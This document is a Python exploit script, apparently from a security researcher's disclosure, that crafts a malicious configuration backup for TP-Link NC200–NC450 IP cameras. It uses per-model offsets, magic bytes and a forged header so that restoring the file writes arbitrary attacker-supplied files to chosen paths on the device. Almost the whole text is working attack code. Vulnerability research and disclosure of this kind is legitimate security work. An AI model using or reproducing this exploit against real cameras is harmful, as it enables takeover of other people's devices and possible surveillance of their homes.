#!/usr/bin/env python

import os
import sys
import base64
import socket
import struct
import hashlib

startOffsets = {}
startOffsets["nc200"] = 0xaf4
startOffsets["nc210"] = 0xaf4
startOffsets["nc220"] = 0x1224
startOffsets["nc230"] = 0x1224
startOffsets["nc250"] = 0xaf4
startOffsets["nc260"] = 0x1224
startOffsets["nc450"] = 0x1224

specialMagic = {}
specialMagic["nc200"] = ""
specialMagic["nc210"] = ""
specialMagic["nc220"] = ""
specialMagic["nc230"] = ""
specialMagic["nc250"] = ""
specialMagic["nc260"] = "\x13\xae\x49\x49\xa8\x57\xec\x1c"
specialMagic["nc450"] = "\x5e\xc5\x1e\xc4\xe0\x7d\xf1\x96"


def addFileEntry(element, fileOffset):
    uploadPath = element.split('|')[0]
    fileSize = os.path.getsize(element.split('|')[1])

    if len(uploadPath) > 63:
        print("upload path too long!")
        quit()

    fileEntry = struct.pack("<I", fileOffset) + struct.pack("<I", fileSize)
    fileEntry += "\x00" * 20 + uploadPath + "\x00" * (64 - len(uploadPath))

    return fileEntry, fileSize

def processInputFiles(inputFiles, fileOffset):
    entrySize  = 0x5c
    fileEntries = ""
    fileContents = ""

    for element in inputFiles:
        entry, fileSize = addFileEntry(element, fileOffset)
        fileEntries += entry
        fileOffset += fileSize
        fileContents += file(element.split('|')[1], 'rb').read()

    return fileEntries, fileContents

def buildConfig(cameraModel, startOffset, totalLength, fileEntries, fileContents):
    magic = "\x7e\x7d\xee\x77"
    configLen = struct.pack("<I", totalLength)
    md5 = hashlib.md5(fileContents).digest()
    fingerprint = "fingerprint" + "\x00" * 9

    config = magic + configLen + md5 + fingerprint + fileEntries

    if cameraModel == "nc210":
        config += fileEntries

    if startOffset > len(config):
        config += "\x00" * (startOffset - len(config))
        config += fileContents
    else:
        print("[-] Too many files in one single package")
        quit()

    return config

print("TP-LINK NCxxx Cameras Arbitrary File Write")
print("Pietro Oliva - <pietroliva|a|t|gmail.com>\n")

if len(sys.argv) < 4:
    print("usage: %s <camera_model> <files_to_upload.txt> <output.config>" % sys.argv[0])
    print("Supported models: nc200 nc210 nc220 nc230 nc250 nc260 nc450")
    quit()

cameraModel = sys.argv[1]

if cameraModel not in startOffsets.keys():
    print("Invalid camera model %s" % cameraModel)
    quit()

inputFiles = file(sys.argv[2], 'rb').read().splitlines()
outputConfigFile = sys.argv[3]
startOffset  = startOffsets[cameraModel]

fileEntries, fileContents = processInputFiles(inputFiles, startOffset)
totalLength = startOffset + len(fileContents)

config = buildConfig(cameraModel, startOffset, totalLength, fileEntries, fileContents)

file(outputConfigFile, 'wb').write(specialMagic[cameraModel] + config)
